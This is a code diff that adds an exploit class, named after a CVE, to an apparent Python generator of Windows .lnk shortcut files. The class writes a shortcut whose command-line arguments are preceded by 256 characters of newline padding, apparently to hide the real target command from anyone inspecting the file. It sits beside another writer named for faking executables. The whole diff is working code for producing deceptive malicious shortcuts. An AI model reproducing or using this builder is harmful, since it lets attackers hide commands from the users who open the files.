@@ -151,3 +151,26 @@ class LnkWriterFakeExeDisabled(LnkWriter):
                 + lnk.target_path.encode('utf-8') + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode('utf-8')))
                 + ''.encode('utf-16le') + ByteTools.create_bytes(0x00, 520)
                 + ByteTools.create_bytes(0x00, 4))
+
+
+class LnkWriterCVE20259491(LnkWriter):
+    @staticmethod
+    def _write_(f: io.BufferedWriter, lnk: LnkDetails) -> None:
+        # SHELL LINK HEADER
+        f.write(SHELL_LINK_HEADER.write(link_flags=[SHELL_LINK_HEADER.LinkFlags.HasArguments,
+                                                    SHELL_LINK_HEADER.LinkFlags.HasIconLocation,
+                                                    SHELL_LINK_HEADER.LinkFlags.HasExpString],
+                                        file_attributes=[],
+                                        show_command=SHELL_LINK_HEADER.ShowCommand.SW_SHOWNORMAL,
+                                        icon_index=lnk.icon_index))
+
+        # STRING DATA
+        padding_characters = '\x0A\x0D'
+        target_cmd = (padding_characters * (256//len(padding_characters))) + lnk.target_cmd
+        f.write(ByteTools.create_bytes(len(target_cmd), 2) + target_cmd.encode('utf-8'))
+        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-8'))
+        # EXTRA DATA
+        f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
+                + lnk.target_path.encode('utf-8') + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode('utf-8')))
+                + lnk.target_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520)
+                + ByteTools.create_bytes(0x00, 4))
